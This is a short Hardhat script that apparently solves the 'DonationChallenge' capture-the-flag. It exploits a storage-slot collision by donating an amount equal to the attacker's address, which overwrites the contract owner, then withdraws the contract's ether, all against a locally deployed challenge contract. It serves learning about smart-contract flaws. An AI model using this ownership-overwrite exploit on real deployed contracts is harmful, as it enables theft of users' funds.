const { BigNumber } = require("ethers");
const { ethers } = require("hardhat");

async function main() {
  const [deployer, attacker, x1] = await hre.ethers.getSigners();
  const MainContract = await ethers.getContractFactory("DonationChallenge", deployer);
  const mainContract = await MainContract.deploy({ value: ethers.utils.parseEther("1") });

  //  slot value changes after
  console.log("OWNER:", await mainContract.owner());
  console.log("ATTACKER:", attacker.address);
  await mainContract.connect(attacker).donate(BigNumber.from(attacker.address), {
    // value should be around 10^12 wei / 10^(-6)ETH
    // low enough to make the exploit easy
    value: BigNumber.from(attacker.address).div(BigNumber.from(10).pow(36)),
  });

  const ownerSlotVal = await ethers.provider.getStorageAt(mainContract.address, BigNumber.from(1).toHexString());
  console.log("New owner address (per storage slot):", ownerSlotVal);

  await mainContract.connect(attacker).withdraw();
  console.log("IS COMPLETE:", await mainContract.isComplete());
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
